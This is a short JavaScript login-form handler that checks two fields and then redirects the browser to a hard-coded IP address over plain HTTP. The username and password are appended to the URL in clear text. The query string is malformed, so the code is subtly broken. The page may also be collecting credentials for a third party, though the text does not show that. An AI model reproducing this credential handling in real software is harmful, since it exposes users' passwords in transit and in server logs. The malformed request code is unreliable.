function submitForm2() {
    
    var name = document.getElementById('lname').value;
    var pass = document.getElementById('lp').value;
    
    if (name != '') {
        
        
        if (pass != '') {
            
            
            
            
            
            window.location.href='http://79.97.52.85/action?=login&name?=' + name + '&password?=' + pass + '/';
                
                
                
                
                
                }
            
            
            
            
            
    
        
        else {
            
            alert('Please do not leave any fields blank!');
            
        }
        
        
}
    
    
    else {
        
        alert('Please do not leave any fields blank!');
        
    }
    
    
    
}